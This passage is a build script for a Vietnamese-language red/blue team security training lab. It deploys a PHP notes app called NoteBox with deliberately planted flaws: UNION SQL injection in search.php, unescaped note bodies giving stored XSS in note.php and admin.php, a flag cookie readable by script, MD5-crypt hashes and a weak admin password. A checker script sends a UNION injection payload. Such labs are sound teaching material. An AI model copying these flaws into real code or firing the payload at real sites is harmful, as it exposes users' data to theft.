function db(){ $m=@new mysqli('localhost','nbuser','nbpass','notebox'); if($m->connect_errno){ http_response_code(503); echo 'Dich vu tam thoi khong san sang (DB).'; exit; } return $m; }
function uid(){ return isset($_SESSION['uid'])?intval($_SESSION['uid']):0; }
function uname(){ return isset($_SESSION['username'])?$_SESSION['username']:''; }
function urole(){ return isset($_SESSION['role'])?$_SESSION['role']:'user'; }
function require_login(){ if(!uid()){ header('Location: index.php'); exit; } }
function hdr($t){ echo "<!doctype html><html><head><meta charset=utf-8><title>".$t." - NoteBox</title><style>body{font-family:system-ui,Arial,sans-serif;max-width:760px;margin:24px auto;padding:0 16px;color:#222}h1,h2{color:#2a4d7a}a{color:#1a7f5a;text-decoration:none}input,textarea{width:100%;padding:8px;margin:4px 0;box-sizing:border-box}button{background:#2a4d7a;color:#fff;padding:8px 16px;border:0;border-radius:4px;cursor:pointer}.card{border:1px solid #e0e0e0;border-radius:8px;padding:14px;margin:10px 0}.nav{background:#2a4d7a;color:#fff;padding:10px 14px;border-radius:8px;margin-bottom:14px}.nav a{color:#fff;margin-right:14px}</style></head><body>"; }
function ftr(){ echo "</body></html>"; }
function nav(){ echo "<div class=nav><b>NoteBox</b> &nbsp; <a href=dashboard.php>Ghi chu</a> <a href=admin.php>Admin</a> <a href=logout.php>Dang xuat</a></div>"; }
PHP

cat > /tmp/nb/index.php <<'PHP'
<?php require __DIR__.'/config.php';
if(uid()){ header('Location: dashboard.php'); exit; }
hdr('Dang nhap'); ?>
<h1>NoteBox</h1><p>Dich vu luu tru ghi chu ca nhan.</p>
<div class=card><h2>Dang nhap</h2>
<form method=post action=login.php>
<input name=username placeholder="Ten dang nhap">
<input name=password type=password placeholder="Mat khau">
<button>Dang nhap</button></form>
<p>Chua co tai khoan? <a href=register.php>Dang ky</a></p></div>
<?php ftr();
PHP

cat > /tmp/nb/register.php <<'PHP'
<?php require __DIR__.'/config.php'; $db=db(); $msg='';
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST'){
  $u=trim(isset($_POST['username'])?$_POST['username']:''); $p=isset($_POST['password'])?$_POST['password']:'';
  if($u!=='' && $p!==''){
    $st=$db->prepare('INSERT INTO users(username,password,role) VALUES(?,?,?)');
    $h=crypt($p,'$1$'.substr(bin2hex(random_bytes(4)),0,8)); $role='user'; $st->bind_param('sss',$u,$h,$role); $st->execute();
    $_SESSION['uid']=$db->insert_id; $_SESSION['username']=$u; $_SESSION['role']='user';
    header('Location: dashboard.php'); exit;
  }
  $msg='Nhap day du ten dang nhap va mat khau.';
}
hdr('Dang ky'); ?>
<h2>Dang ky tai khoan</h2>
<?php if($msg){ echo "<p style=\"color:#c00\">".htmlspecialchars($msg)."</p>"; } ?>
<div class=card><form method=post action=register.php>
<input name=username placeholder="Ten dang nhap">
<input name=password type=password placeholder="Mat khau">
<button>Tao tai khoan</button></form>
<p><a href=index.php>Quay lai dang nhap</a></p></div>
<?php ftr();
PHP

cat > /tmp/nb/login.php <<'PHP'
<?php require __DIR__.'/config.php'; $db=db();
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST'){
  $u=isset($_POST['username'])?$_POST['username']:''; $p=isset($_POST['password'])?$_POST['password']:'';
  // Dang nhap prepared (khong SQLi o day) - nhung mat khau bam MD5 (yeu)
  $st=$db->prepare('SELECT id,username,password,role FROM users WHERE username=?');
  $st->bind_param('s',$u); $st->execute();
  $r=$st->get_result()->fetch_assoc();
  if($r && is_string($r['password']) && $r['password']===crypt($p,$r['password'])){
    $_SESSION['uid']=$r['id']; $_SESSION['username']=$r['username']; $_SESSION['role']=$r['role'];
    if($r['role']==='admin'){
      // Admin co mot "session token" trong cookie doc duoc boi JS (chinh la XSS flag)
      $x=@trim(@file_get_contents('/var/lib/notebox/xssflag.txt'));
      setcookie('ssession',$x,0,'/');
    }
    header('Location: dashboard.php'); exit;
  }
  hdr('Dang nhap'); echo "<!-- LOGIN_FAIL -->";
  echo "<div class=card><p style=\"color:#c00\">Sai ten dang nhap hoac mat khau.</p><p><a href=index.php>Thu lai</a></p></div>"; ftr(); exit;
}
header('Location: index.php');
PHP

cat > /tmp/nb/dashboard.php <<'PHP'
<?php require __DIR__.'/config.php'; require_login(); $db=db(); $me=uid();
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST' && isset($_POST['title'])){
  $t=trim($_POST['title']); $b=isset($_POST['body'])?$_POST['body']:'';
  if($t!==''){ $st=$db->prepare('INSERT INTO notes(owner_id,title,body) VALUES(?,?,?)');
    $st->bind_param('iss',$me,$t,$b); $st->execute(); }
  header('Location: dashboard.php'); exit;
}
hdr('Ghi chu'); nav(); echo "<!-- AUTH_OK uid=".$me." -->";
echo "<h2>Ghi chu cua ".htmlspecialchars(uname())."</h2>";
echo "<form method=get action=search.php><input name=q placeholder=\"Tim ghi chu cua ban\"><button>Tim</button></form>";
$st=$db->prepare('SELECT id,title FROM notes WHERE owner_id=?'); $st->bind_param('i',$me); $st->execute(); $r=$st->get_result();
echo "<ul>"; while($n=$r->fetch_assoc()){ echo "<li><a href=\"note.php?id=".$n['id']."\">".htmlspecialchars($n['title'])."</a></li>"; } echo "</ul>"; ?>
<div class=card><h3>Tao ghi chu moi</h3>
<form method=post action=dashboard.php>
<input name=title placeholder="Tieu de">
<textarea name=body rows=4 placeholder="Noi dung"></textarea>
<button>Luu ghi chu</button></form></div>
<?php ftr();
PHP

cat > /tmp/nb/note.php <<'PHP'
<?php require __DIR__.'/config.php'; require_login(); $db=db(); $me=uid();
$id=intval(isset($_GET['id'])?$_GET['id']:0);
$st=$db->prepare('SELECT owner_id,title,body FROM notes WHERE id=?'); $st->bind_param('i',$id); $st->execute();
$n=$st->get_result()->fetch_assoc();
hdr('Ghi chu'); nav();
if(!$n){ echo "<p>Khong tim thay ghi chu.</p>"; ftr(); exit; }
if($n['owner_id']!=$me){ http_response_code(403); echo "<p>403 - Day khong phai ghi chu cua ban.</p>"; ftr(); exit; }
// LO HONG Stored XSS: in body note KHONG escape (giong admin.php - app quen escape o MOI noi hien body)
echo "<h2>".htmlspecialchars($n['title'])."</h2><div class=card><pre>".$n['body']."</pre></div>";
echo "<p><a href=dashboard.php>Quay lai</a></p>"; ftr();
PHP

cat > /tmp/nb/search.php <<'PHP'
<?php require __DIR__.'/config.php'; require_login(); $db=db(); $me=uid();
$q=isset($_GET['q'])?$_GET['q']:'';
hdr('Tim kiem'); nav();
echo "<h2>Ket qua tim: ".htmlspecialchars($q)."</h2>";
// LO HONG SQLi (UNION): ghep chuoi; + verbose error (lo thong tin)
$sql="SELECT id,title FROM notes WHERE owner_id=".$me." AND title LIKE '%".$q."%'";
$res=$db->query($sql);
if(!$res){ echo "<p>Loi SQL: ".htmlspecialchars($db->error)."</p>"; }
else { echo "<ul>"; while($row=$res->fetch_assoc()){ echo "<li>".htmlspecialchars($row['title'])."</li>"; } echo "</ul>"; }
echo "<p><a href=dashboard.php>Quay lai</a></p>"; ftr();
PHP

cat > /tmp/nb/admin.php <<'PHP'
<?php require __DIR__.'/config.php'; require_login(); $db=db();
// Kiem quyen DUNG CACH (role tu session server)
if(urole()!=='admin'){ http_response_code(403); hdr('Admin'); nav(); echo "<p>403 - Chi danh cho quan tri vien.</p>"; ftr(); exit; }
hdr('Admin'); nav(); echo "<!-- ADMIN_PANEL -->";
$flag=@trim(@file_get_contents('/var/lib/notebox/flag.txt'));
echo "<div class=card><b>Bi mat he thong (System secret):</b> ".htmlspecialchars($flag)."</div>";
echo "<h2>Tat ca ghi chu nguoi dung</h2><ul>";
$res=$db->query("SELECT u.username AS un, n.title AS t, n.body AS b FROM notes n JOIN users u ON u.id=n.owner_id");
if($res){ while($row=$res->fetch_assoc()){
  // LO HONG Stored XSS: in body note KHONG escape (admin xem -> JS chay)
  echo "<li><b>".htmlspecialchars($row['un'])."</b> / ".htmlspecialchars($row['t']).": ".$row['b']."</li>";
} }
echo "</ul>"; ftr();
PHP

cat > /tmp/nb/logout.php <<'PHP'
<?php require __DIR__.'/config.php'; $_SESSION=array(); setcookie('ssession','',time()-3600,'/'); session_destroy(); header('Location: index.php');
PHP

S mkdir -p /var/www/html
S cp /tmp/nb/config.php /tmp/nb/index.php /tmp/nb/register.php /tmp/nb/login.php /tmp/nb/dashboard.php /tmp/nb/note.php /tmp/nb/search.php /tmp/nb/admin.php /tmp/nb/logout.php /var/www/html/
S rm -f /var/www/html/index.html 2>/dev/null

# Bi mat he A = SENTINEL (khong phai flag that)
S mkdir -p /var/lib/notebox
S bash -c 'echo "ADMIN_SECRET_A_SENTINEL" > /var/lib/notebox/flag.txt; echo "XSS_SENTINEL_A" > /var/lib/notebox/xssflag.txt; chmod 644 /var/lib/notebox/*.txt; chown -R www-data:www-data /var/lib/notebox'

# MariaDB: seed idempotent; CHO root ket noi duoc roi moi seed MOT LAN (chiu timing service len cham)
cat > /tmp/seed.sql <<'SQL'
CREATE DATABASE IF NOT EXISTS notebox;
GRANT ALL PRIVILEGES ON notebox.* TO 'nbuser'@'localhost' IDENTIFIED BY 'nbpass';
GRANT ALL PRIVILEGES ON notebox.* TO 'nbuser'@'127.0.0.1' IDENTIFIED BY 'nbpass';
FLUSH PRIVILEGES;
USE notebox;
DROP TABLE IF EXISTS notes; DROP TABLE IF EXISTS users;
CREATE TABLE users(id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(64), password VARCHAR(64), role VARCHAR(16));
CREATE TABLE notes(id INT AUTO_INCREMENT PRIMARY KEY, owner_id INT, title VARCHAR(128), body TEXT);
INSERT INTO users(username,password,role) VALUES('admin','$1$aUDLM4c3$Mb/CvTYkXvIi3YpuhRrgp/','admin');
INSERT INTO users(username,password,role) VALUES('checker','$1$e6ZA7djS$GcaVd5EVaLVjfS.56g2YX0','user');
INSERT INTO users(username,password,role) VALUES('checkeradmin','$1$1jCy5VQ$zRC/9ZnF4sR/.9p8QRyLk.','admin');
INSERT INTO notes(owner_id,title,body) VALUES(2,'my-note','CHECKER_NOTE_OK <xsstest>XSSPROBE</xsstest>');
SQL
S systemctl enable mariadb 2>/dev/null || true
S systemctl start mariadb 2>/dev/null || S service mariadb start 2>/dev/null || S service mysql start 2>/dev/null || true
for i in $(seq 1 60); do S mysql -e 'SELECT 1' >/dev/null 2>&1 && break; sleep 3; done
S bash -c 'mysql < /tmp/seed.sql'

# Apache + rsyslog
S systemctl enable apache2 2>/dev/null || true
S systemctl restart apache2 2>/dev/null || S service apache2 restart 2>/dev/null || true
S service rsyslog start 2>/dev/null || S systemctl start rsyslog 2>/dev/null || true

# Wazuh agent giam sat access.log
LF='<localfile><log_format>apache</log_format><location>/var/log/apache2/access.log</location></localfile>'
S sed -i "s#</ossec_config>#${LF}</ossec_config>#" /var/ossec/etc/ossec.conf 2>/dev/null
S systemctl restart wazuh-agent 2>/dev/null || S service wazuh-agent restart 2>/dev/null || true

# analyst de va (so huu webroot -> sua code PHP khong can sudo)
S useradd -m -s /bin/bash analyst 2>/dev/null
S bash -c 'echo "analyst:analyst" | chpasswd'
S chown -R analyst:analyst /var/www/html
cat > /tmp/findings.txt <<'FND'
# BAO CAO DIEU TRA (Blue) - dien gia tri ban TU TIM DUOC qua SIEM/log (KEY=value):
# ATTACKER_IP : IP ke tan cong
# VULN1       : lo hong 1 (vd: UNION SQL injection tren /search.php)
# VULN2       : lo hong 2 (vd: Stored XSS - /admin.php in noi dung note khong escape)
ATTACKER_IP=
VULN1=
VULN2=
FND
S cp /tmp/findings.txt /home/analyst/findings.txt
S chown analyst:analyst /home/analyst/findings.txt
S chmod 644 /home/analyst/findings.txt

exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/prestop" <<'__EOF_PP_5x9q__'
#!/bin/bash
# prestop he A (Blue) = "checker": kiem qua HTTP (session cookie).
#   - SLA  : dang nhap checker + dashboard + doc note cua minh -> app con chay dung
#   - SQLi : UNION o /search.php co loi ra marker khong? (con lo hong?)
#   - XSS  : note chua <script> co bi in RAW o /admin.php khong? (con lo hong?)
# Checker dung tai khoan checkeradmin (CHI CO tren he A, vo dung voi he B) de xem admin panel.
# Chi in co/OK, khong lo dap an.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_A"
B="http://localhost"
Jc="/tmp/ckc.$$"; Ja="/tmp/cka.$$"; rm -f "$Jc" "$Ja"

# Dang nhap checker (user thuong)
curl -s -c "$Jc" -b "$Jc" -L --data-urlencode "username=checker" --data-urlencode "password=checkerpw" "$B/login.php" >/dev/null 2>&1
# SLA: dashboard (AUTH_OK) + doc note cua minh (id1 -> CHECKER_NOTE_OK)
if curl -s -b "$Jc" "$B/dashboard.php" 2>/dev/null | grep -q 'AUTH_OK' && \
   curl -s -b "$Jc" "$B/note.php?id=1" 2>/dev/null | grep -q 'CHECKER_NOTE_OK'; then echo "SLA_OK"; fi
# SQLi: UNION tra ve marker
curl -s -b "$Jc" "$B/search.php?q=zzz%27%20UNION%20SELECT%201%2C%27SQLIMARKER%27%20--%20" 2>/dev/null | grep -q 'SQLIMARKER' && echo "SQLI_OPEN"
# XSS: note cua checker (id1) chua the <xsstest>. Kiem CA note.php (chinh chu) lan admin.php (admin)
# -> con in RAW o BAT KY trang nao => con lo hong (buoc Blue phai escape o CA HAI noi hien body)
XR=0
curl -s -b "$Jc" "$B/note.php?id=1" 2>/dev/null | grep -q '<xsstest>XSSPROBE' && XR=1
curl -s -c "$Ja" -b "$Ja" -L --data-urlencode "username=checkeradmin" --data-urlencode "password=checkeradminpw" "$B/login.php" >/dev/null 2>&1
curl -s -b "$Ja" "$B/admin.php" 2>/dev/null | grep -q '<xsstest>XSSPROBE' && XR=1
[ "$XR" = "1" ] && echo "XSS_OPEN"
rm -f "$Jc" "$Ja"

# Bao cao Blue (chi in OK)
F=/home/analyst/findings.txt
grep '^ATTACKER_IP=' "$F" 2>/dev/null | grep -q '172.20.0.5' && echo "REP_IP_OK"
grep '^VULN1=' "$F" 2>/dev/null | grep -qiE 'sql|injection|union|tiem' && echo "REP_V1_OK"
grep '^VULN2=' "$F" 2>/dev/null | grep -qiE 'xss|cross|script|cookie' && echo "REP_V2_OK"

exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/treataslocal" <<'__EOF_PP_5x9q__'
apache2
__EOF_PP_5x9q__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/fixlocal.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# targetb (he B - NoteBox "production", MariaDB), quyen 'ubuntu'. $1 = mat khau sudo.
# Giong he A (cung ma nguon, cung lo hong) nhung CHUA VA + co FLAG/XSSFLAG that + /submit.php.
# admin dung MAT KHAU YEU (co trong wordlist) -> crack duoc. Chi HTTP (khong SSH).
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }
mkdir -p /tmp/nb

cat > /tmp/nb/config.php <<'PHP'
<?php
session_start();
mysqli_report(MYSQLI_REPORT_OFF);
function db(){ $m=@new mysqli('localhost','nbuser','nbpass','notebox'); if($m->connect_errno){ http_response_code(503); echo 'Dich vu tam thoi khong san sang (DB).'; exit; } return $m; }
function uid(){ return isset($_SESSION['uid'])?intval($_SESSION['uid']):0; }
function uname(){ return isset($_SESSION['username'])?$_SESSION['username']:''; }
function urole(){ return isset($_SESSION['role'])?$_SESSION['role']:'user'; }
function require_login(){ if(!uid()){ header('Location: index.php'); exit; } }
function hdr($t){ echo "<!doctype html><html><head><meta charset=utf-8><title>".$t." - NoteBox</title><style>body{font-family:system-ui,Arial,sans-serif;max-width:760px;margin:24px auto;padding:0 16px;color:#222}h1,h2{color:#2a4d7a}a{color:#1a7f5a;text-decoration:none}input,textarea{width:100%;padding:8px;margin:4px 0;box-sizing:border-box}button{background:#2a4d7a;color:#fff;padding:8px 16px;border:0;border-radius:4px;cursor:pointer}.card{border:1px solid #e0e0e0;border-radius:8px;padding:14px;margin:10px 0}.nav{background:#2a4d7a;color:#fff;padding:10px 14px;border-radius:8px;margin-bottom:14px}.nav a{color:#fff;margin-right:14px}</style></head><body>"; }
function ftr(){ echo "</body></html>"; }
function nav(){ echo "<div class=nav><b>NoteBox (production)</b> &nbsp; <a href=dashboard.php>Ghi chu</a> <a href=admin.php>Admin</a> <a href=logout.php>Dang xuat</a></div>"; }
PHP

cat > /tmp/nb/index.php <<'PHP'
<?php require __DIR__.'/config.php';
if(uid()){ header('Location: dashboard.php'); exit; }
hdr('Dang nhap'); ?>
<h1>NoteBox (production)</h1><p>Dich vu luu tru ghi chu ca nhan.</p>
<div class=card><h2>Dang nhap</h2>
<form method=post action=login.php>
<input name=username placeholder="Ten dang nhap">
<input name=password type=password placeholder="Mat khau">
<button>Dang nhap</button></form>
<p>Chua co tai khoan? <a href=register.php>Dang ky</a></p></div>
<?php ftr();
PHP

cat > /tmp/nb/register.php <<'PHP'
<?php require __DIR__.'/config.php'; $db=db(); $msg='';
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST'){
  $u=trim(isset($_POST['username'])?$_POST['username']:''); $p=isset($_POST['password'])?$_POST['password']:'';
  if($u!=='' && $p!==''){
    $st=$db->prepare('INSERT INTO users(username,password,role) VALUES(?,?,?)');
    $h=crypt($p,'$1$'.substr(bin2hex(random_bytes(4)),0,8)); $role='user'; $st->bind_param('sss',$u,$h,$role); $st->execute();
    $_SESSION['uid']=$db->insert_id; $_SESSION['username']=$u; $_SESSION['role']='user';
    header('Location: dashboard.php'); exit;
  }
  $msg='Nhap day du ten dang nhap va mat khau.';
}
hdr('Dang ky'); ?>
<h2>Dang ky tai khoan</h2>
<?php if($msg){ echo "<p style=\"color:#c00\">".htmlspecialchars($msg)."</p>"; } ?>
<div class=card><form method=post action=register.php>
<input name=username placeholder="Ten dang nhap">
<input name=password type=password placeholder="Mat khau">
<button>Tao tai khoan</button></form>
<p><a href=index.php>Quay lai dang nhap</a></p></div>
<?php ftr();
PHP

cat > /tmp/nb/login.php <<'PHP'
<?php require __DIR__.'/config.php'; $db=db();
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST'){
  $u=isset($_POST['username'])?$_POST['username']:''; $p=isset($_POST['password'])?$_POST['password']:'';
  $st=$db->prepare('SELECT id,username,password,role FROM users WHERE username=?');
  $st->bind_param('s',$u); $st->execute();
  $r=$st->get_result()->fetch_assoc();
  if($r && is_string($r['password']) && $r['password']===crypt($p,$r['password'])){
    $_SESSION['uid']=$r['id']; $_SESSION['username']=$r['username']; $_SESSION['role']=$r['role'];
    if($r['role']==='admin'){
      $x=@trim(@file_get_contents('/var/lib/notebox/xssflag.txt'));
      setcookie('ssession',$x,0,'/');
    }
    header('Location: dashboard.php'); exit;
  }
  hdr('Dang nhap'); echo "<!-- LOGIN_FAIL -->";
  echo "<div class=card><p style=\"color:#c00\">Sai ten dang nhap hoac mat khau.</p><p><a href=index.php>Thu lai</a></p></div>"; ftr(); exit;
}
header('Location: index.php');
PHP

cat > /tmp/nb/dashboard.php <<'PHP'
<?php require __DIR__.'/config.php'; require_login(); $db=db(); $me=uid();
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST' && isset($_POST['title'])){
  $t=trim($_POST['title']); $b=isset($_POST['body'])?$_POST['body']:'';
  if($t!==''){ $st=$db->prepare('INSERT INTO notes(owner_id,title,body) VALUES(?,?,?)');
    $st->bind_param('iss',$me,$t,$b); $st->execute(); }
  header('Location: dashboard.php'); exit;
}
hdr('Ghi chu'); nav(); echo "<!-- AUTH_OK uid=".$me." -->";
echo "<h2>Ghi chu cua ".htmlspecialchars(uname())."</h2>";
echo "<form method=get action=search.php><input name=q placeholder=\"Tim ghi chu cua ban\"><button>Tim</button></form>";
$st=$db->prepare('SELECT id,title FROM notes WHERE owner_id=?'); $st->bind_param('i',$me); $st->execute(); $r=$st->get_result();
echo "<ul>"; while($n=$r->fetch_assoc()){ echo "<li><a href=\"note.php?id=".$n['id']."\">".htmlspecialchars($n['title'])."</a></li>"; } echo "</ul>"; ?>
<div class=card><h3>Tao ghi chu moi</h3>
<form method=post action=dashboard.php>
<input name=title placeholder="Tieu de">
<textarea name=body rows=4 placeholder="Noi dung"></textarea>
<button>Luu ghi chu</button></form></div>
<?php ftr();
PHP

cat > /tmp/nb/note.php <<'PHP'
<?php require __DIR__.'/config.php'; require_login(); $db=db(); $me=uid();
$id=intval(isset($_GET['id'])?$_GET['id']:0);
$st=$db->prepare('SELECT owner_id,title,body FROM notes WHERE id=?'); $st->bind_param('i',$id); $st->execute();
$n=$st->get_result()->fetch_assoc();
hdr('Ghi chu'); nav();
if(!$n){ echo "<p>Khong tim thay ghi chu.</p>"; ftr(); exit; }
if($n['owner_id']!=$me){ http_response_code(403); echo "<p>403 - Day khong phai ghi chu cua ban.</p>"; ftr(); exit; }
// LO HONG Stored XSS: in body note KHONG escape (giong admin.php)
echo "<h2>".htmlspecialchars($n['title'])."</h2><div class=card><pre>".$n['body']."</pre></div>";
echo "<p><a href=dashboard.php>Quay lai</a></p>"; ftr();
PHP

cat > /tmp/nb/search.php <<'PHP'
<?php require __DIR__.'/config.php'; require_login(); $db=db(); $me=uid();
$q=isset($_GET['q'])?$_GET['q']:'';
hdr('Tim kiem'); nav();
echo "<h2>Ket qua tim: ".htmlspecialchars($q)."</h2>";
$sql="SELECT id,title FROM notes WHERE owner_id=".$me." AND title LIKE '%".$q."%'";
$res=$db->query($sql);
if(!$res){ echo "<p>Loi SQL: ".htmlspecialchars($db->error)."</p>"; }
else { echo "<ul>"; while($row=$res->fetch_assoc()){ echo "<li>".htmlspecialchars($row['title'])."</li>"; } echo "</ul>"; }
echo "<p><a href=dashboard.php>Quay lai</a></p>"; ftr();
PHP

cat > /tmp/nb/admin.php <<'PHP'
<?php require __DIR__.'/config.php'; require_login(); $db=db();
if(urole()!=='admin'){ http_response_code(403); hdr('Admin'); nav(); echo "<p>403 - Chi danh cho quan tri vien.</p>"; ftr(); exit; }
hdr('Admin'); nav(); echo "<!-- ADMIN_PANEL -->";
$flag=@trim(@file_get_contents('/var/lib/notebox/flag.txt'));
echo "<div class=card><b>Bi mat he thong (System secret):</b> ".htmlspecialchars($flag)."</div>";
echo "<h2>Tat ca ghi chu nguoi dung</h2><ul>";
$res=$db->query("SELECT u.username AS un, n.title AS t, n.body AS b FROM notes n JOIN users u ON u.id=n.owner_id");
if($res){ while($row=$res->fetch_assoc()){
  // LO HONG Stored XSS: in body note KHONG escape
  echo "<li><b>".htmlspecialchars($row['un'])."</b> / ".htmlspecialchars($row['t']).": ".$row['b']."</li>";
} }
echo "</ul>"; ftr();
PHP

cat > /tmp/nb/logout.php <<'PHP'
<?php require __DIR__.'/config.php'; $_SESSION=array(); setcookie('ssession','',time()-3600,'/'); session_destroy(); header('Location: index.php');
PHP

cat > /tmp/nb/submit.php <<'PHP'
<?php require __DIR__.'/config.php';
// "Gameserver": SV nop FLAG (chuoi SQLi->crack->admin) va XSSFLAG (cookie admin qua XSS).
$flag=@trim(@file_get_contents('/var/lib/notebox/flag.txt'));
$xss=@trim(@file_get_contents('/var/lib/notebox/xssflag.txt'));
$f=trim(isset($_REQUEST['flag'])?$_REQUEST['flag']:'');
$x=trim(isset($_REQUEST['xss'])?$_REQUEST['xss']:'');
$out='';
if($f!=='' && $f===$flag){ @file_put_contents('/tmp/.flagok','1'); @chmod('/tmp/.flagok',0644); $out.='FLAG chinh: DUNG. '; }
elseif($f!==''){ $out.='FLAG chinh: sai. '; }
if($x!=='' && $x===$xss){ @file_put_contents('/tmp/.xssok','1'); @chmod('/tmp/.xssok',0644); $out.='XSS flag: DUNG. '; }
elseif($x!==''){ $out.='XSS flag: sai. '; }
hdr('Nop flag'); echo "<div class=card><p>".($out!==''?htmlspecialchars($out):'Gui ?flag=... va/hoac ?xss=...')."</p></div>";
echo "<p><a href=index.php>Trang chu</a></p>"; ftr();
PHP

S mkdir -p /var/www/html
S cp /tmp/nb/config.php /tmp/nb/index.php /tmp/nb/register.php /tmp/nb/login.php /tmp/nb/dashboard.php /tmp/nb/note.php /tmp/nb/search.php /tmp/nb/admin.php /tmp/nb/logout.php /tmp/nb/submit.php /var/www/html/
S rm -f /var/www/html/index.html 2>/dev/null

# FLAG that + XSSFLAG that (ca nhan hoa), luu FILE (SQLi khong doc duoc file)
S mkdir -p /var/lib/notebox
S bash -c 'echo "FLAG-FLAGVAL" > /var/lib/notebox/flag.txt; echo "XSSFLAG-XSSVAL" > /var/lib/notebox/xssflag.txt; chmod 644 /var/lib/notebox/*.txt; chown -R www-data:www-data /var/lib/notebox'

# MariaDB: admin MAT KHAU YEU (letmein99 - co trong wordlist); seed idempotent, cho root ket noi roi seed
cat > /tmp/seed.sql <<'SQL'
CREATE DATABASE IF NOT EXISTS notebox;
GRANT ALL PRIVILEGES ON notebox.* TO 'nbuser'@'localhost' IDENTIFIED BY 'nbpass';
GRANT ALL PRIVILEGES ON notebox.* TO 'nbuser'@'127.0.0.1' IDENTIFIED BY 'nbpass';
FLUSH PRIVILEGES;
USE notebox;
DROP TABLE IF EXISTS notes; DROP TABLE IF EXISTS users;
CREATE TABLE users(id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(64), password VARCHAR(64), role VARCHAR(16));
CREATE TABLE notes(id INT AUTO_INCREMENT PRIMARY KEY, owner_id INT, title VARCHAR(128), body TEXT);
INSERT INTO users(username,password,role) VALUES('admin','$1$SYkp0wuL$3zeH4fusFw616LJfR9wg81','admin');
INSERT INTO notes(owner_id,title,body) VALUES(1,'welcome','Chao mung den NoteBox production');
SQL
S systemctl enable mariadb 2>/dev/null || true
S systemctl start mariadb 2>/dev/null || S service mariadb start 2>/dev/null || S service mysql start 2>/dev/null || true
for i in $(seq 1 60); do S mysql -e 'SELECT 1' >/dev/null 2>&1 && break; sleep 3; done
S bash -c 'mysql < /tmp/seed.sql'

S systemctl enable apache2 2>/dev/null || true
S systemctl restart apache2 2>/dev/null || S service apache2 restart 2>/dev/null || true

exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/prestop" <<'__EOF_PP_5x9q__'
#!/bin/bash
# prestop he B (Red): SV nop FLAG + XSSFLAG qua /submit.php -> B tu so voi bi mat cua chinh no.
# B khong co shell -> SV khong the gia cac marker nay.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER_B"
[ -f /tmp/.flagok ] && echo "FLAG_OK" || echo "FLAG_NO"
[ -f /tmp/.xssok ]  && echo "XSS_OK"  || echo "XSS_NO"

exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/targetb/_bin"
cat > "$LAB/targetb/_bin/treataslocal" <<'__EOF_PP_5x9q__'
apache2
__EOF_PP_5x9q__
echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/targeta/_bin/* "$LAB"/targetb/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh "$LAB"/attacker/*.py 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-patch-pwn"
